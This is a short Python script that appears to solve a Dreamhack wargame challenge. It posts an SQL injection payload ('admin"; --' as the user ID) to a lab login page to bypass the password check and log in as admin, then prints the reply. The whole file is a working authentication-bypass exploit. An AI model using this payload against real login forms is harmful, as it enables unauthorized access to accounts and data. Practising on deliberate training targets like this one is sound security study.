import requests

HOST = "http://host3.dreamhack.games"
PORT = "24422"
ATTACK_URI = "/login"
POST_DATA = {"userid":'admin"; --', "userpassword":"11--"}

URL = HOST + ":" + PORT + ATTACK_URI

resp = requests.post(URL, data=POST_DATA)

print(resp.text)